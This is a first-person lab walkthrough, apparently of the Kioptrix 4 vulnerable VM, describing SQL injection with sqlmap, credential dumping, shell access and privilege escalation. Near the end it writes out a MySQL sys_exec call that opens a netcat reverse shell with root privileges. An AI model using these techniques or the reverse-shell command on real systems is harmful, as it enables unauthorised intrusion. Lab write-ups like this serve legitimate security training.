There doesn't seem to be anything interesting with the web server. I'm assuming that I have to rely on sql injection but I'm not sure yet. There is /john, which contains john.php. I also tried robert and that contained robert.php.<br/>
<br/>
I found Samba exploit but https://www.rapid7.com/db/modules/exploit/linux/samba/setinfopolicy_heap but it didn't seem to work. I think I'll do more research into sql injection.<br/>
<br/>
When submitting login data, I noticed that the post request submitted to checklogin.php. I set up sqlmap to find issues but it found nothing. <br/>
<br/>
I manually put in something in login form and I got this<br/>
<img src="image.png"/><br/>
<br/>
I also put in the same string I put in for sqlinjection in koptrix 1 or 2 and got this<br/>
<img src="image 2.png"/><br/>
<br/>
I modified the username= to john and robert. this pops up<br/>
<img src="image 3.png"/><br/>
<br/>
There requests are involved in logging in<br/>
<img src="image 4.png"/><br/>
<br/>
I can do XSS<br/>
<img src="image 5.png"/><br/>
<br/>
<br/>
Using phpinfo didn't work. using sqlmap on member.php and username field didn't work either. However, I went back and used sqlmap with the login request. Since I now know that the mypassworld field is vulnerable, I can use sqlmap to see what I can get out. I used my query from burp, pasted it into a file and used that with sqlmap.<br/>
<br/>
<img src="image 6.png"/><br/>
<br/>
<img src="image 7.png"/><br/>
<br/>
--dump-all was a dumb idea. It was taking too long. I killed it and did --dump instead. <br/>
<br/>
<img src="image 8.png"/><br/>
<br/>
Now I can login using that info.<br/>
<br/>
Visiting /john/john.php and /robert/robert.php shows the same thing as logged in page.<br/>
<img src="image 9.png"/><br/>
<br/>
I think there might be a file inclusion vuln.<br/>
<br/>
<img src="image 10.png"/><br/>
<br/>
This doesn't work if the username doesn't exist. Using php://filter/convert.base64-encode/resource= doesn't work either.<br/>
<br/>
--os-shell in sqlmap gets us a shell lol<br/>
<br/>
<img src="image 11.png"/><br/>
<br/>
And I got a shell with netcat<br/>
<img src="image 12.png"/><br/>
<br/>
mysql info<br/>
<img src="image 13.png"/><br/>
<br/>
<img src="image 14.png"/><br/>
<br/>
The system is Ubuntu 8.04.3 LTS with kernel 2.6.24.<br/>
<br/>
I can't access crontab files. <br/>
<br/>
I looked at the www directory and saw this but 1234 when SSH in as john didn't work.<br/>
:<img src="image 15.png"/><br/>
<br/>
I used the password that I got from doing dump and that did get me into john's account.<br/>
<br/>
<img src="image 16.png"/><br/>
<br/>
Both john and robert accounts are using kshell<br/>
<br/>
<img src="image 17.png"/><br/>
<br/>
Looking at history file from the netcat shell gives more information<br/>
<img src="image 18.png"/><br/>
<br/>
I tried three exploits to get root privs but they didn't work. I had a look at a walkthrough for a hint. Hint is that mysql is running as root. I noticed that when i looked at the process list. I tried to get mysql to load shadow file but it didn't so I thought, it didn't have permissions.<br/>
<br/>
Besides loading files with mysql, you can execute commands using sys_exec.<br/>
<img src="image 19.png"/><br/>
<br/>
I used the following to get a reverse shell select sys_exec(&quot;netcat -e /bin/bash 10.0.0.22 8001&quot;); and it was with root privs.<br/>
<br/>
After looking at other walkthroughs I learned that this exploit would have worked https://www.exploit-db.com/exploits/9545/<br/>
